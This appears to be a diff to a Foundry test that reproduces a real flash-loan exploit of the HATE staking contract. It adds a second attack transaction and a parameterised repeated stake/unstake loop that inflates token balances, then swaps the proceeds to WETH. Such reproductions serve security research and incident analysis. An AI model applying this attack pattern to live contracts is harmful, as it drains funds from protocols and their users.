@@ -4,10 +4,12 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-// @KeyInfo - Total Lost : ~6ETH
+// @KeyInfo - Total Lost : ~8ETH
 // Attacker : https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6
 // Attack Contract : https://etherscan.io/address/0x8faa53a742fc732b04db4090a21e955fe5c230be
+// Attack Contract : https://etherscan.io/address/0x38702e5c98ba4ad4b786d5a075a5c74694cd616d
 // Attack Tx : https://etherscan.io/tx/0xe28ca1f43036f4768776805fb50906f8172f75eba3bf1d9866bcd64361fda834
+// Attack Tx : https://etherscan.io/tx/0x8e1b0ab098c4cc5f632e00b0842b5f825bbd15ded796d4a59880bb724f6c5372
 
 // @Analysis
 // Post-mortem : https://www.google.com/
@@ -38,41 +40,53 @@ contract ContractTest is Test {
     Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     Staking HATEStaking = Staking(0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8);
     IsHATE sHATE = IsHATE(0xf829d7014Db17D6DCe448bE958c7e4983cdb1F77);
-    uint amount = 907_615_399_181_304;
+    uint flashAmount;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18069528 - 1);
+        vm.createSelectFork("mainnet");
         vm.label(address(HATE), "HATE");
         vm.label(address(WETH), "WETH");
         vm.label(address(HATE_ETH_Pair), "Uniswap HATE");
         vm.label(address(HATEStaking), "HATEStaking");
         vm.label(address(sHATE), "sHATE");
-        approveAll();
     }
 
-    function testExploit() external{
+    function testExploit1() external{
+        vm.rollFork(18069528 - 1);
+        approveAll();
         console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
-        HATE_ETH_Pair.swap(amount,0, address(this), abi.encode(3));
+        flashAmount = HATE.balanceOf(address(HATE_ETH_Pair))*9/10;
+        HATE_ETH_Pair.swap(flashAmount, 0, address(this), hex"03");
+        
         address[] memory path = new address[](2);
         (path[0], path[1]) = (address(HATE), address(WETH));
-        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(HATE.balanceOf(address(this)), 0, path,
-                                                                     address(this), type(uint256).max);
-        uint intRes =  WETH.balanceOf(address(this))/1 ether;
-        uint decRes =  WETH.balanceOf(address(this)) - intRes * 1e18;
-        console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
+        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(HATE.balanceOf(address(this)), 0, path, address(this), block.timestamp);
+        emit log_named_decimal_uint("WETH balance after swap", WETH.balanceOf(address(this)), WETH.decimals());    
     }
 
-     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
-         uint stakeAmount = amount;
-         while(true){
-             HATEStaking.stake(address(this), stakeAmount);
-             stakeAmount = sHATE.balanceOf(address(this));
-             HATEStaking.unstake(address(this), stakeAmount, true);
-             if(stakeAmount > 1_468_562_883_234_511){
-                break;
-             }
+    function testExploit2() external{
+        vm.rollFork(18071199 - 1);
+        approveAll();
+        console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
+        flashAmount = HATE.balanceOf(address(HATE_ETH_Pair))*7/10;
+        HATE_ETH_Pair.swap(flashAmount, 0, address(this), hex"1e");
+        
+        address[] memory path = new address[](2);
+        (path[0], path[1]) = (address(HATE), address(WETH));
+        uniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(HATE.balanceOf(address(this)), 0, path, address(this), block.timestamp);
+        emit log_named_decimal_uint("WETH balance after swap", WETH.balanceOf(address(this)), WETH.decimals());    
+    }
+
+     function uniswapV2Call(address /*sender*/, uint amount0, uint /*amount1*/, bytes calldata data) external {
+        uint i = 0;
+         while(i < uint8(data[0])){
+            uint balanceAttacker = HATE.balanceOf(address(this));
+            HATEStaking.stake(address(this), balanceAttacker);
+            uint sTokenBalance = sHATE.balanceOf(address(this));
+            HATEStaking.unstake(address(this), sTokenBalance, true);
+            i += 1;
          }
-         HATE.transfer(address(HATE_ETH_Pair), uint(amount*1000/997) +1);
+         HATE.transfer(address(HATE_ETH_Pair), uint(amount0*1000/997) +1);
     }
 
     function approveAll() internal {
